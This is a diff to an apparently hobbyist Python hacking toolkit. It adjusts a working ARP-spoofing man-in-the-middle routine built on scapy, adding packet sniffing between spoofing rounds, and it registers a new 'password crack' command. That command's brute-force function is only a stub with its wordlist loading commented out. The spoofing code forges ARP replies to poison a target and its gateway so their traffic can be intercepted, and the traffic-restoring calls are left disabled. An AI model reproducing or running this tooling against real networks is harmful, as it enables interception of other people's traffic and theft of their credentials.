@@ -33,6 +33,7 @@ def help():
     print("     ",colored(0, 255, 0, commands[7]), "chack for all alive connexion on your local network")
     print("     ",colored(0, 255, 0, commands[5]), "attack a device with 'man in the middle' attack")
     print("     ",colored(0, 255, 0, commands[6]), "looks for a username in various websites")
+    print("     ",colored(0, 255, 0, commands[10]), "crack a password using brutforce methode")
 
 
 def conf():
@@ -122,7 +123,6 @@ def mitm():
     for i in scan['scan']:
         if i == target_ip:
             destinationMac = scan['scan'][i]['addresses']['mac']
-            print("here")
     for i in scan['scan']:
         if i == local_ip:
             print(local_ip)
@@ -148,7 +148,6 @@ def ip():
 
 def spoofer(targetIP, spoofIP, destinationMac):
     packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
-    print(packet)
     scapy.send(packet, verbose=False)
 
 def restore(destinationIP, sourceIP, destinationMac):
@@ -162,7 +161,9 @@ def start(targetIP, gatewayIP, destinationMac):
         while mitmattack:
             spoofer(targetIP,gatewayIP, destinationMac)
             spoofer(gatewayIP,targetIP, destinationMac)
-            print("\r[+] Sent packets "+ str(packets)),
+            print("\r[+] Sent packets "+ str(packets))
+            scapy.sniff(filter='arp and host %s or %s' %\
+                        (gatewayIP, targetIP), count=1)
             sys.stdout.flush()
             packets +=2
             time.sleep(2)
@@ -171,6 +172,19 @@ def start(targetIP, gatewayIP, destinationMac):
         mitmattack = False
         #restore(targetIP,gatewayIP, destinationMac)
         #restore(gatewayIP,targetIP, destinationMac)
+
+def psw_crack():
+    url = str(input("Enter login page {} : ".format( colored(0, 255, 0, "URL"))))
+    post = str(input("Enter the {} made : ".format( colored(0, 255, 0, "request"))))
+    error_msg = str(input("Enter {} : ".format(colored(255, 0, 0, "Error message"))))
+    #psw = pd.read_csv(rockyou.txt, encoding= 'unicode_escape')
+
+    #with open("rockyou.txt", encoding = 'UTF-8') as psw:
+        #P = psw.readlines()
+        #print(P)
+        #psw.close()
+
+
 
 def main():
     run = True
@@ -211,6 +225,8 @@ def main():
                 mitm()
             if cmd == "search":
                 search()
+            if cmd == "password crack":
+                psw_crack()
         else:
             print("\n")
             print(colored(255, 0, 0, "      '{}'".format(cmd)), colored(50, 50, 150, " is not a command, use help to see all the commands."))
@@ -257,7 +273,7 @@ except ValueError:
 
 url = ["https://www.twitter.com/", "https://www.instagram.com/"]
 
-commands = ["exit", "scan", "help", "clear", "scan firewall", "mitm", "search", "scan all", "ip", "config"]
+commands = ["exit", "scan", "help", "clear", "scan firewall", "mitm", "search", "scan all", "ip", "config", "password crack"]
 
 sourceMAC  = str(get_mac())
 
